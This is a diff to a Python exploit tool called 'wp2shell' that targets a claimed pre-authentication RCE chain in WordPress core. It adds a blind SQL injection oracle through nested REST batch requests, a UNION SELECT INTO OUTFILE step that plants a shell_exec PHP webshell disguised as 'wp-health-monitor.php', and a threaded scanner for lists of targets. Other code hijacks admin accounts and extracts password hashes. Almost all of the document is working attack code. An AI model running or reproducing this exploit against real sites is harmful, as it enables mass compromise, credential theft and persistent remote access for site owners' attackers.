@@ -1,12 +1,17 @@
 #!/usr/bin/env python3
 """
 wp2shell - Pre-Authentication RCE in WordPress Core
-CVE-2026-63030 | CVSS 9.8
-Author: Thomas Jordan (st4ndard)
-Credit: https://nvd.nist.gov/vuln/detail/CVE-2026-63030
+CVE-2026-63030 + CVE-2026-60137 | CVSS 9.8
+Discovered by Adam Kues (Assetnote / Searchlight Cyber)
+SQLi also credited to TF1T, dtro, haongo.
 
-Affects: WordPress 6.9.0-6.9.4, 7.0.0-7.0.1
-Fixed in: 6.9.5, 7.0.2
+Full RCE chain (batch confusion + SQLi):
+  WordPress 6.9.0–6.9.4 and 7.0.0–7.0.1
+
+SQLi sink only (needs facilitating plugin/theme):
+  WordPress 6.8.0–6.8.5
+
+Fixed in: 6.8.6 / 6.9.5 / 7.0.2
 
 Vulnerability chain:
   1. WP_REST_Server::serve_batch_request_v1() has an index desync:
@@ -41,6 +46,9 @@ import random
 import base64
 import statistics
 import ssl
+import threading
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from collections import Counter
 from urllib.parse import quote, urlencode, urlparse
 
 import urllib3
@@ -87,7 +95,7 @@ class WP2Shell:
 
     def __init__(self, target, proxy=None, timeout=30,
                  table_prefix="wp_", verbose=False,
-                 sleep_duration=0.15):
+                 sleep_duration=0.15, time_based=False):
         self.target = target.rstrip('/')
         self.s = requests.Session()
         self.s.verify = False
@@ -103,11 +111,45 @@ class WP2Shell:
         self.tp = table_prefix
         self.verbose = verbose
         self.sleep_sec = sleep_duration
+        self.time_based = time_based
+        self._canonical = False
         self.batch_url = None
         self.shell_url = None
         self.shell_key = None
         self.cutoff = None
         self._resolve_batch_endpoint()
+
+    # -- Redirect-safe HTTP helpers ------------------------------------------
+    # requests downgrades POST→GET on 301/302/303, silently dropping the
+    # batch payload.  Pin the canonical URL once and POST without redirect.
+
+    def _canonicalize_base(self):
+        """Follow root redirect once to lock canonical scheme://host."""
+        if self._canonical:
+            return
+        self._canonical = True
+        try:
+            r = self.s.get(self.target + "/", timeout=self.timeout,
+                           allow_redirects=True)
+            final = r.url.rstrip("/")
+            if final != self.target:
+                vlog(f"Canonical base: {self.target} → {final}",
+                     self.verbose)
+                self.target = final
+                self.batch_url = None
+        except Exception:
+            pass
+
+    def _post_no_redirect(self, url, **kwargs):
+        """POST preserving body across redirects (301/302/303 keep POST)."""
+        kwargs.setdefault("timeout", self.timeout)
+        r = self.s.post(url, allow_redirects=False, **kwargs)
+        if r.status_code in (301, 302, 303, 307, 308):
+            loc = r.headers.get("Location", "")
+            if loc:
+                vlog(f"POST redirect {url} → {loc}", self.verbose)
+                return self.s.post(loc, allow_redirects=False, **kwargs)
+        return r
 
     # -- Endpoint resolution -------------------------------------------------
 
@@ -161,6 +203,123 @@ class WP2Shell:
         self.batch_url = candidates[1]
         vlog("Defaulting to query-string batch endpoint", self.verbose)
 
+    # -- Version detection ----------------------------------------------------
+
+    # Vuln ranges
+    #   Full RCE chain (batch confusion + SQLi): 6.9.0–6.9.4, 7.0.0–7.0.1
+    #   SQLi sink only (needs facilitating plugin/theme): 6.8.0–6.8.5
+    #   Fixed: 6.8.6 / 6.9.5 / 7.0.2
+    _FULL_CHAIN = [
+        ((6, 9, 0), (6, 9, 4)),
+        ((7, 0, 0), (7, 0, 1)),
+    ]
+    _SQLI_ONLY = [
+        ((6, 8, 0), (6, 8, 5)),
+    ]
+
+    @staticmethod
+    def _version_in_range(ver, ranges):
+        for lo, hi in ranges:
+            if lo <= ver <= hi:
+                return True
+        return False
+
+    @staticmethod
+    def _classify_version(ver):
+        """Return 'full_chain', 'sqli_only', or 'patched'."""
+        if WP2Shell._version_in_range(ver, WP2Shell._FULL_CHAIN):
+            return 'full_chain'
+        if WP2Shell._version_in_range(ver, WP2Shell._SQLI_ONLY):
+            return 'sqli_only'
+        return 'patched'
+
+    def detect_version(self):
+        """Try to fingerprint the WordPress version.
+
+        Returns (major, minor, patch) tuple or None.
+        """
+        methods = [
+            # REST API index (fastest, most reliable)
+            lambda: self._version_from_rest(),
+            # HTML meta generator tag
+            lambda: self._version_from_html(),
+            # RSS feed
+            lambda: self._version_from_feed(),
+        ]
+        for method in methods:
+            ver = method()
+            if ver:
+                return ver
+        return None
+
+    def _version_from_rest(self):
+        try:
+            r = self.s.get(self.target + "/wp-json/", timeout=10)
+            m = re.search(
+                r'"generator":"[^"]*?(\d+)\.(\d+)(?:\.(\d+))?"',
+                r.text)
+            if not m:
+                r = self.s.get(
+                    self.target + "/?rest_route=/", timeout=10)
+                m = re.search(
+                    r'"generator":"[^"]*?(\d+)\.(\d+)(?:\.(\d+))?"',
+                    r.text)
+            if m:
+                return (
+                    int(m.group(1)),
+                    int(m.group(2)),
+                    int(m.group(3)) if m.group(3) else 0,
+                )
+        except Exception:
+            pass
+        return None
+
+    def _version_from_html(self):
+        try:
+            r = self.s.get(self.target + "/", timeout=10)
+            m = re.search(
+                r'name="generator"\s+content="WordPress\s+(\d+)\.(\d+)(?:\.(\d+))?"',
+                r.text)
+            if m:
+                return (
+                    int(m.group(1)),
+                    int(m.group(2)),
+                    int(m.group(3)) if m.group(3) else 0,
+                )
+        except Exception:
+            pass
+        return None
+
+    def _version_from_feed(self):
+        try:
+            for path in ("/feed/", "/feed/rss2/"):
+                r = self.s.get(self.target + path, timeout=10)
+                m = re.search(
+                    r'[?&]v=(\d+)\.(\d+)(?:\.(\d+))?', r.text)
+                if m:
+                    return (
+                        int(m.group(1)),
+                        int(m.group(2)),
+                        int(m.group(3)) if m.group(3) else 0,
+                    )
+        except Exception:
+            pass
+        return None
+
+    def check_version(self):
+        """Detect version and check against known-vulnerable ranges.
+
+        Returns (ver, classification) where classification is one of:
+          'full_chain' — vulnerable to the complete pre-auth RCE
+          'sqli_only'  — SQLi sink present but needs a facilitating plugin
+          'patched'    — fixed or out of documented range
+          None         — version could not be detected (ver is None)
+        """
+        ver = self.detect_version()
+        if ver is None:
+            return None, None
+        return ver, self._classify_version(ver)
+
     # -- Low-level batch helpers ---------------------------------------------
 
     @staticmethod
@@ -204,6 +363,7 @@ class WP2Shell:
         return params
 
     def _batch(self, sub_requests, extra_timeout=15):
+        self._canonicalize_base()
         if self._waf_bypass:
             params = {
                 "rest_route": "/batch/v1",
@@ -215,8 +375,8 @@ class WP2Shell:
                            timeout=self.timeout + extra_timeout)
         else:
             payload = {"validation": "normal", "requests": sub_requests}
-            r = self.s.post(self.batch_url, json=payload,
-                            timeout=self.timeout + extra_timeout)
+            r = self._post_no_redirect(self.batch_url, json=payload,
+                                       timeout=self.timeout + extra_timeout)
         ct = r.headers.get('Content-Type', '')
         if 'json' not in ct:
             raise ValueError(
@@ -225,9 +385,37 @@ class WP2Shell:
             )
         return r.json()
 
+    def _batch_inner(self, inner_requests, extra_timeout=15):
+        """Shortcut: wrap inner requests with 4-request outer batch."""
+        return self._batch(
+            self._outer_batch(inner_requests)["requests"], extra_timeout)
+
     @staticmethod
     def _malformed():
-        return {"method": "POST", "path": "http://:"}
+        return {"method": "POST", "path": "///"}
+
+    @staticmethod
+    def _outer_batch(inner_requests):
+        """Build the 4-request outer batch (dinosn-verified stable pattern).
+
+        [0] categories touch → occupies index 0
+        [1] malformed       → $matches shift +1 (carrier at [2]→batch at [3])
+        [2] carrier         → self-calls batch handler with inner requests
+        [3] batch/v1        → supplies the batch handler for carrier
+
+        The extra [0] ensures the malformed trigger at index=1 shifts
+        carrier→batch correctly even on restrictive WP configurations.
+        """
+        return {"requests": [
+            {"method": "POST", "path": "/v2/categories",
+             "body": {"name": "x"}},
+            {"method": "POST", "path": "///",
+             "body": {"name": "x"}},
+            {"method": "POST", "path": "/wp/v2/posts",
+             "body": {"requests": inner_requests}},
+            {"method": "POST", "path": "/batch/v1",
+             "body": {"requests": []}},
+        ]}
 
     # ========================================================================
     # Phase 1: Non-destructive detection
@@ -310,6 +498,54 @@ class WP2Shell:
     # The subquery evaluates the condition. If true, SLEEP fires and the
     # response is delayed. Time-based blind boolean oracle.
 
+    # -- Boolean oracle dispatch ---------------------------------------------
+
+    def _content_bool(self, condition):
+        """Content-based boolean oracle (NO SLEEP, deterministic).
+
+        Injects a subquery that returns post_author=1 when condition is TRUE
+        (filtering the "Hello world!" post → 0 results) or 999999999 when
+        FALSE (no filter → posts returned).  Reads the inner batch response
+        body to count returned posts.
+
+        Returns: True (condition true, 0 posts), False (condition false,
+        posts present), or None (response malformed / error).
+        """
+        sqli = f"SELECT IF(({condition}), 1, 999999999)"
+        inner = [
+            {"method": "GET", "path": "http://:"},
+            {"method": "GET", "path": "/wp/v2/categories?" + urlencode(
+                {"author_exclude": sqli})},
+            {"method": "GET", "path": "/wp/v2/posts"},
+        ]
+        outer = [
+            self._malformed(),
+            {"method": "POST", "path": "/wp/v2/posts",
+             "body": {"requests": inner}},
+            {"method": "POST", "path": "/batch/v1"},
+        ]
+        try:
+            data = self._batch(outer, extra_timeout=15)
+            inner_body = data.get('responses', [{}])[1].get('body', {})
+            inner_r = inner_body.get('responses', [])
+            if len(inner_r) >= 2:
+                body = inner_r[1].get('body', {})
+                if isinstance(body, list):
+                    return len(body) == 0  # True → 0 posts, False → >0 posts
+        except Exception:
+            pass
+        return None
+
+    def _oracle_bool(self, condition):
+        """Dispatch to content-based (default) or time-based boolean oracle."""
+        if self.time_based:
+            elapsed = self._sqli_probe(condition)
+            result = elapsed > self.cutoff
+            vlog(f"  time_bool({condition[:50]}...) "
+                 f"= {result}  ({elapsed:.3f}s)", self.verbose)
+            return result
+        return self._content_bool(condition)
+
     def _sqli_probe(self, condition):
         """Send one nested-batch SQLi probe and return elapsed time."""
         inner_requests = [
@@ -344,7 +580,21 @@ class WP2Shell:
         return time.perf_counter() - start
 
     def _sqli_calibrate(self, samples=3):
-        """Calibrate the timing oracle by measuring true/false baselines."""
+        """Calibrate: content-based just verifies True≠False;
+        time-based measures SLEEP baseline vs delay."""
+        if not self.time_based:
+            log("Verifying content-based boolean oracle...")
+            t1 = self._content_bool("1=1")
+            t2 = self._content_bool("1=0")
+            if t1 is None or t2 is None:
+                log("Content oracle not responding (no published posts?)", "-")
+                return False
+            if t1 is True and t2 is False:
+                log(f"Content oracle verified: 1=1→{t1}, 1=0→{t2}", "+")
+                return True
+            log(f"Content oracle ambiguous: 1=1→{t1}, 1=0→{t2}", "-")
+            return False
+        # Time-based calibration
         log("Calibrating timing oracle...")
         fast_times = [self._sqli_probe("1=0") for _ in range(samples)]
         slow_times = [self._sqli_probe("1=1") for _ in range(samples)]
@@ -366,24 +616,28 @@ class WP2Shell:
         return True
 
     def _sqli_bool(self, condition):
-        """Boolean oracle: returns True if condition is true in the DB."""
-        elapsed = self._sqli_probe(condition)
-        result = elapsed > self.cutoff
-        vlog(f"  bool({condition[:60]}...) "
-             f"= {result}  ({elapsed:.3f}s)", self.verbose)
-        return result
+        """Boolean oracle: returns True if condition is true in the DB.
+        Dispatches to content-based (default) or time-based (--time-based)."""
+        return self._oracle_bool(condition)
 
     def _sqli_confirm(self):
         """Confirm blind SQLi via nested batch re-entrancy.
 
-        Calibrates the timing oracle, then verifies with a known-true
-        and known-false condition.
+        Content mode (default): deterministic 1=1/1=0 differential via
+        post count in response body.  Time mode (--time-based): SLEEP
+        latency comparison.
         """
-        log("Confirming SQL injection via nested batch re-entrancy...")
+        mode = "time-based" if self.time_based else "content-based"
+        log(f"Confirming SQL injection via nested batch ({mode})...")
 
         if not self._sqli_calibrate():
             log("SQL injection did not fire", "-")
             return False
+
+        if not self.time_based:
+            # Content oracle already verified by _sqli_calibrate
+            log("SQL injection CONFIRMED via nested batch", "+")
+            return True
 
         t1 = self._sqli_bool("1=1")
         t2 = self._sqli_bool("1=0")
@@ -525,6 +779,94 @@ class WP2Shell:
                 continue
 
         log("OUTFILE failed (expected on hardened MySQL configs)", "!")
+        return False
+
+    # -- 3a2: UNION SELECT INTO OUTFILE (faster, cleaner) --------------------
+    # WordPress 6.9 wp_posts has 23 columns.  Column 5 is post_content (longtext)
+    # which accepts arbitrary hex-encoded PHP code without type conflicts.
+    _WP_POSTS_COLS = 23
+    _OUTFILE_COL_IDX = 5  # post_content column
+
+    def _try_union_outfile(self, webroot, shell_key):
+        """Write a PHP webshell via UNION SELECT ... INTO OUTFILE.
+
+        NOTE: This technique requires MySQL FILE privilege AND works ONLY when
+        WP_Query does NOT use the split-pagination optimisation (i.e. when
+        `posts_per_page` is -1 or `no_found_rows` is true). Under default
+        pagination WP_Query selects only `wp_posts.ID` (1 column), and the
+        multi-line SQL structure defeats `-- ` line comments — MySQL's
+        ORDER BY / LIMIT on subsequent lines causes "global ORDER clause"
+        error 1228.  Falls through gracefully to the next phase.
+        """
+        log("Phase 3a: UNION SELECT INTO OUTFILE (direct file write)...")
+
+        shell_hash = hashlib.sha256(shell_key.encode()).hexdigest()
+        shell_php = (
+            f"<?php if(hash_equals('{shell_hash}',"
+            f"hash('sha256',$_REQUEST['k']??'')))"
+            "{echo '<pre>'.htmlspecialchars("
+            "shell_exec($_REQUEST['c'])).'</pre>';} ?>"
+        )
+        shell_hex = "0x" + shell_php.encode().hex()
+
+        union_cols = []
+        for i in range(1, self._WP_POSTS_COLS + 1):
+            if i == self._OUTFILE_COL_IDX:
+                union_cols.append(shell_hex)
+            else:
+                union_cols.append("''")
+        union_sel = ",".join(union_cols)
+
+        paths = [
+            (f"{webroot}/wp-content/uploads/wp-health-monitor.php",
+             "/wp-content/uploads/wp-health-monitor.php"),
+            (f"{webroot}/wp-health-monitor.php",
+             "/wp-health-monitor.php"),
+        ]
+
+        for filepath, url_path in paths:
+            # Try /* block comment to handle multi-line SQL
+            sqli_value = (
+                f"0) AND 1=0 UNION SELECT "
+                f"{union_sel} "
+                f"INTO OUTFILE '{filepath}'/*"
+            )
+
+            vlog(f"  UNION OUTFILE → {filepath}", self.verbose)
+            inner = [
+                {"method": "GET", "path": "http://:"},
+                {"method": "GET", "path": "/wp/v2/categories?" + urlencode({
+                    "author_exclude": sqli_value,
+                })},
+                {"method": "GET", "path": "/wp/v2/posts"},
+            ]
+            outer = [
+                self._malformed(),
+                {"method": "POST", "path": "/wp/v2/posts",
+                 "body": {"requests": inner}},
+                {"method": "POST", "path": "/batch/v1"},
+            ]
+            try:
+                self._batch(outer, extra_timeout=10)
+            except Exception:
+                continue
+
+            # Verify the shell
+            check_url = self.target + url_path
+            try:
+                r = self.s.get(check_url,
+                               params={"k": shell_key, "c": "echo wp2shell_ok"},
+                               timeout=10)
+                if "wp2shell_ok" in r.text:
+                    self.shell_url = check_url
+                    self.shell_key = shell_key
+                    log(f"UNION OUTFILE webshell deployed!", "+")
+                    log(f"Shell: {check_url}", "+")
+                    return True
+            except Exception:
+                continue
+
+        log("UNION OUTFILE failed (split-query or no FILE priv)", "!")
         return False
 
     # -- 3b: Admin credential extraction -------------------------------------
@@ -776,17 +1118,19 @@ class WP2Shell:
 
     def exploit(self, webroot="/var/www/html", shell_key=None,
                 admin_user=None, admin_pass=None, skip_outfile=False,
-                skip_create_admin=False):
+                skip_create_admin=False, skip_union_outfile=False):
         """Full pre-auth RCE chain.
 
         Tries the fastest RCE path first, falling back through
         progressively slower methods:
 
-          3a  Stacked INSERT -> create admin -> login -> plugin upload
-              (fastest; no webroot needed, no blind extraction)
-          3b  SELECT INTO OUTFILE -> direct webshell write
-              (needs MySQL FILE priv + writable webroot)
-          3c  Blind extraction of existing admin + hash crack
+          3a  UNION SELECT INTO OUTFILE → direct webshell write
+              (fastest; needs MySQL FILE priv + writable webroot)
+          3b  Stacked INSERT → create admin → login → plugin upload
+              (needs multi_query support, rare)
+          3c  Subquery INTO OUTFILE → direct webshell write
+              (legacy; needs FILE priv + permissive secure_file_priv)
+          3d  Blind extraction of existing admin + hash crack
               (slow but works on any vulnerable instance)
         """
         if shell_key is None:
@@ -820,9 +1164,18 @@ class WP2Shell:
             return False
         print()
 
-        # -- Phase 3a: Create admin via stacked INSERT (fastest, no webroot) --
+        # -- Phase 3a: UNION SELECT INTO OUTFILE (fastest, need FILE priv) --
+        if not skip_union_outfile:
+            log("Phase 3a: UNION SELECT INTO OUTFILE")
+            if self._try_union_outfile(webroot, shell_key):
+                print()
+                self._interactive_shell()
+                return True
+            print()
+
+        # -- Phase 3b: Create admin via stacked INSERT (needs multi_query) --
         if not skip_create_admin:
-            log("Phase 3a: Create admin + login + plugin upload")
+            log("Phase 3b: Create admin + login + plugin upload")
             if self._sqli_create_admin(admin_user, admin_pass):
                 print()
                 self._upload_shell_plugin(shell_key)
@@ -832,17 +1185,17 @@ class WP2Shell:
                 return False
             print()
 
-        # -- Phase 3b: OUTFILE (needs FILE priv + writable dir) --
+        # -- Phase 3c: Legacy subquery OUTFILE (FILE priv + writable dir) --
         if not skip_outfile:
-            log("Phase 3b: Direct webshell via SELECT INTO OUTFILE")
+            log("Phase 3c: Direct webshell via SELECT INTO OUTFILE (legacy)")
             if self._try_outfile(webroot, shell_key):
                 print()
                 self._interactive_shell()
                 return True
             print()
 
-        # -- Phase 3c: Extract admin creds via blind SQLi --
-        log("Phase 3c: Extracting admin credentials via blind SQLi...")
+        # -- Phase 3d: Extract admin creds via blind SQLi --
+        log("Phase 3d: Extracting admin credentials via blind SQLi...")
         log("(This will take several minutes)")
         print()
         ext_user, ext_hash = self._extract_admin_creds()
@@ -855,8 +1208,8 @@ class WP2Shell:
         log(f"Existing admin hash:  {ext_hash}", "+")
         print()
 
-        # -- Phase 3d: Try stacked UPDATE on existing admin --
-        log(f"Phase 3d: Updating existing admin password to: {admin_pass}")
+        # -- Phase 3e: Try stacked UPDATE on existing admin --
+        log(f"Phase 3e: Updating existing admin password to: {admin_pass}")
         if self._sqli_update_password(ext_user, admin_pass):
             log("Password updated!", "+")
             self._upload_shell_plugin(shell_key)
@@ -864,9 +1217,9 @@ class WP2Shell:
                 self._interactive_shell()
             return True
 
-        # -- Phase 3e: Offline crack instructions --
+        # -- Phase 3f: Offline crack instructions --
         print()
-        log("Phase 3e: Direct password update failed. "
+        log("Phase 3f: Direct password update failed. "
             "Crack the hash offline:", "!")
         print()
         log(f"  echo '{ext_hash}' > hash.txt", ">")
@@ -1023,10 +1376,10 @@ def main():
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog=BANNER)
 
-    parser.add_argument("target",
+    parser.add_argument("target", nargs="?",
                         help="WordPress URL (http:// or https://)")
 
-    mode = parser.add_mutually_exclusive_group(required=True)
+    mode = parser.add_mutually_exclusive_group()
     mode.add_argument("--check", action="store_true",
                       help="Non-destructive vulnerability probe only")
     mode.add_argument("--exploit", action="store_true",
@@ -1058,15 +1411,116 @@ def main():
                              "--cleanup; random if omitted)")
     parser.add_argument("--skip-outfile", action="store_true",
                         help="Skip SELECT INTO OUTFILE attempt")
+    parser.add_argument("--no-union-outfile", action="store_true",
+                        help="Skip UNION SELECT INTO OUTFILE attempt")
     parser.add_argument("--no-create-admin", action="store_true",
                         help="Skip stacked INSERT admin creation "
                              "(fall through to OUTFILE / blind extraction)")
     parser.add_argument("--sleep", type=float, default=0.15,
                         help="SLEEP duration for blind SQLi (default: 0.15)")
+    parser.add_argument("--time-based", action="store_true",
+                        help="Use SLEEP-based timing oracle instead of "
+                             "content-based (slower but works without "
+                             "published posts)")
+    parser.add_argument("--skip-version-check", action="store_true",
+                        help="Skip WordPress version detection "
+                             "(use when version can't be fingerprinted)")
+    parser.add_argument("-f", "--file",
+                        help="File with one target URL per line (batch scan)")
+    parser.add_argument("-t", "--threads", type=int, default=10,
+                        help="Concurrent workers for batch scan (default: 10)")
+    parser.add_argument("--authorized", action="store_true",
+                        help="Assert authorization for remote targets")
+    parser.add_argument("--json", action="store_true",
+                        help="Emit JSON output (for batch scan)")
+    parser.add_argument("--proof", action="store_true",
+                        help="Read @@version + current_user() as evidence "
+                             "(read-only, requires confirmed SQLi)")
     parser.add_argument("-v", "--verbose", action="store_true",
                         help="Verbose output")
 
     args = parser.parse_args()
+
+    # -- Batch scan mode (-f/--file) --
+    if args.file:
+        targets = []
+        with open(args.file) as fh:
+            for ln in fh:
+                ln = ln.strip()
+                if ln and not ln.startswith("#"):
+                    targets.append(ln if "://" in ln else "http://" + ln)
+        if args.target:
+            targets.insert(0, args.target)
+
+        remote = [u for u in targets if not _is_local(u)]
+        if remote and not args.authorized:
+            log("Refusing remote targets without --authorized.", "-")
+            log(f"Affected: {', '.join(remote[:5])}"
+                f"{'...' if len(remote) > 5 else ''}", "!")
+            log("Only test assets you own or are explicitly authorized.", "!")
+            sys.exit(2)
+
+        total = len(targets)
+        workers = max(1, min(args.threads, total))
+        results = [None] * total
+        done = [0]
+        lock = threading.Lock()
+
+        def _work(idx, u):
+            try:
+                rec, _ = _scan_one(u, args)
+            except Exception as e:
+                rec = {"target": u, "status": "error", "error": str(e)}
+            with lock:
+                done[0] += 1
+                results[idx] = rec
+                if not args.json:
+                    _print_scan_result(rec, done[0], total)
+                else:
+                    sys.stderr.write(f"\r  scanned {done[0]}/{total}")
+                    sys.stderr.flush()
+            return rec
+
+        if workers == 1:
+            for i, u in enumerate(targets):
+                _work(i, u)
+        else:
+            with ThreadPoolExecutor(max_workers=workers) as ex:
+                futs = [ex.submit(_work, i, u) for i, u in enumerate(targets)]
+                try:
+                    for _ in as_completed(futs):
+                        pass
+                except KeyboardInterrupt:
+                    sys.stderr.write("\ninterrupted\n")
+                    ex.shutdown(wait=False, cancel_futures=True)
+
+        results = [r for r in results if r is not None]
+        if args.json:
+            sys.stderr.write("\n")
+            print(json.dumps(results, indent=2))
+
+        c = Counter(r["status"] for r in results)
+        print(f"\nsummary: {len(results)} scanned | "
+              f"vulnerable={c.get('vulnerable',0)}  "
+              f"affected={c.get('affected_version',0)}  "
+              f"not_vuln={c.get('not_vulnerable',0)}  "
+              f"error={c.get('error',0)}")
+        sys.exit(0 if any(
+            r["status"] in ("vulnerable", "affected_version")
+            for r in results) else 1)
+
+    # -- Single-target mode --
+    _has_mode = any([args.check, args.exploit, args.shell,
+                     args.cleanup, bool(args.extract)])
+    if not args.target or not _has_mode:
+        parser.error("specify target+mode (--check/--exploit/...) "
+                     "or use -f for batch scan")
+
+    # Authorisation guard for remote single targets
+    if not _is_local(args.target) and not args.authorized:
+        log("Remote target requires --authorized.", "-")
+        log("Only test assets you own or are explicitly authorized.", "!")
+        sys.exit(2)
 
     wp = WP2Shell(
         target=args.target,
@@ -1075,7 +1529,41 @@ def main():
         table_prefix=args.table_prefix,
         verbose=args.verbose,
         sleep_duration=args.sleep,
+        time_based=args.time_based,
     )
+
+    # -- Version check (skip for --shell / --cleanup which use known creds) --
+    _needs_version_check = (
+        not args.skip_version_check
+        and (args.exploit or args.check or bool(args.extract))
+    )
+    if _needs_version_check:
+        ver, classification = wp.check_version()
+        ver_str = f"{ver[0]}.{ver[1]}.{ver[2]}" if ver else "unknown"
+        if ver is None:
+            log(f"WordPress version: {ver_str} (could not detect)", "!")
+            log("Use --skip-version-check to bypass version detection "
+                "and proceed with exploit attempt.", "!")
+            sys.exit(2)
+        if classification == 'full_chain':
+            log(f"WordPress version: {ver_str} — VULNERABLE (full RCE chain)", "+")
+        elif classification == 'sqli_only':
+            log(f"WordPress version: {ver_str} — SQLi present but batch "
+                f"confusion NOT reachable", "!")
+            log("CVE-2026-60137 (author__not_in SQLi) requires a facilitating "
+                "plugin/theme to pass a raw string to WP_Query.", "!")
+            log("Full pre-auth RCE chain (CVE-2026-63030) only affects "
+                "6.9.0–6.9.4 and 7.0.0–7.0.1.", "!")
+            if not args.skip_version_check:
+                log("Use --skip-version-check to attempt exploitation anyway.", "!")
+                sys.exit(2)
+        else:
+            log(f"WordPress version: {ver_str} — patched or out of range", "-")
+            log("Vulnerable ranges:", "!")
+            log("  Full RCE: 6.9.0–6.9.4, 7.0.0–7.0.1", "!")
+            log("  SQLi only: 6.8.0–6.8.5 (needs facilitating plugin)", "!")
+            log("Use --skip-version-check to force exploitation attempt.", "!")
+            sys.exit(2)
 
     if args.check:
         print(BANNER)
@@ -1090,6 +1578,7 @@ def main():
             admin_pass=args.admin_pass,
             skip_outfile=args.skip_outfile,
             skip_create_admin=args.no_create_admin,
+            skip_union_outfile=args.no_union_outfile,
         )
         sys.exit(0 if ok else 1)
 
@@ -1106,12 +1595,113 @@ def main():
         sys.exit(0 if ok else 1)
 
     elif args.extract:
+        if args.proof:
+            # Read-only evidence: @@version + current_user()
+            for label, query in [
+                ("@@version", "SELECT @@version"),
+                ("current_user()", "SELECT CURRENT_USER()"),
+            ]:
+                log(f"Reading {label}...")
+                result = wp.extract_data(query)
+                if result:
+                    log(f"{label}: {result}", "+")
+                else:
+                    log(f"{label}: FAILED", "-")
+            sys.exit(0)
         result = wp.extract_data(args.extract)
         if result:
             print()
             log(f"Result: {result}", "+")
             sys.exit(0)
         sys.exit(1)
+
+
+# -- batch-scan helpers (module-level) ------------------------------------
+
+def _is_local(url):
+    host = urlparse(url).hostname or ""
+    return host in ("localhost", "127.0.0.1", "::1", "[::1]")
+
+
+def _scan_one(target_url, args):
+    """Scan a single target; returns (record, exit_code)."""
+    rec = {"target": target_url}
+    try:
+        wp = WP2Shell(
+            target=target_url, proxy=args.proxy,
+            timeout=args.timeout, table_prefix=args.table_prefix,
+            verbose=False, sleep_duration=args.sleep,
+            time_based=args.time_based,
+        )
+        ver, classification = wp.check_version()
+        rec["wp_version"] = f"{ver[0]}.{ver[1]}.{ver[2]}" if ver else None
+        rec["version_verdict"] = classification or "unknown"
+
+        vuln = wp.check()
+        if vuln is True:
+            rec["status"] = "vulnerable"
+            rec["active_check"] = "confirmed"
+        elif vuln is None and classification == "full_chain":
+            rec["status"] = "affected_version"
+            rec["active_check"] = "inconclusive"
+            rec["note"] = "version in full-chain range but probe inconclusive"
+        elif classification == "sqli_only":
+            rec["status"] = "affected_version"
+            rec["active_check"] = "negative"
+            rec["note"] = ("SQLi sink present (CVE-2026-60137) but batch "
+                           "confusion not reachable on 6.8.x — needs "
+                           "facilitating plugin/theme")
+        elif classification == "patched":
+            rec["status"] = "not_vulnerable"
+            rec["active_check"] = "negative"
+        else:
+            rec["status"] = "unknown"
+            rec["active_check"] = rec.get("active_check", "error")
+
+        if getattr(args, "proof", False) and vuln is True:
+            try:
+                rec["proof"] = {
+                    "@@version": wp.extract_data(
+                        "SELECT @@version",),
+                    "current_user()": wp.extract_data(
+                        "SELECT CURRENT_USER()",),
+                }
+            except Exception as e:
+                rec["proof_error"] = str(e)
+    except Exception as e:
+        rec["status"] = "error"
+        rec["error"] = str(e)
+    code = 0 if rec["status"] in ("vulnerable", "affected_version") else 1
+    return rec, code
+
+
+def _print_scan_result(rec, index=0, total=1):
+    """Human-readable scan result line."""
+    tag_colors = {
+        "vulnerable": "\033[91m", "affected_version": "\033[93m",
+        "not_vulnerable": "\033[92m", "unknown": "\033[96m",
+        "error": "\033[90m",
+    }
+    tag = {
+        "vulnerable": "VULNERABLE",
+        "affected_version": "AFFECTED",
+        "not_vulnerable": "not vulnerable",
+        "unknown": "unknown",
+        "error": "ERROR",
+    }[rec["status"]]
+    c = tag_colors.get(rec["status"], "")
+    pfx = f"[{index}/{total}] " if total > 1 else ""
+    line = f"  {c}[{tag}]\033[0m {pfx}{rec['target']}"
+    if rec.get("wp_version"):
+        line += f"  (WP {rec['wp_version']}, {rec['version_verdict']})"
+    if rec.get("note"):
+        line += f"\n        note: {rec['note']}"
+    if rec.get("proof"):
+        for k, v in rec["proof"].items():
+            line += f"\n        proof  {k:16s} = {v}"
+    if rec.get("error"):
+        line += f"  -- {rec['error']}"
+    print(line)
 
 
 if __name__ == "__main__":
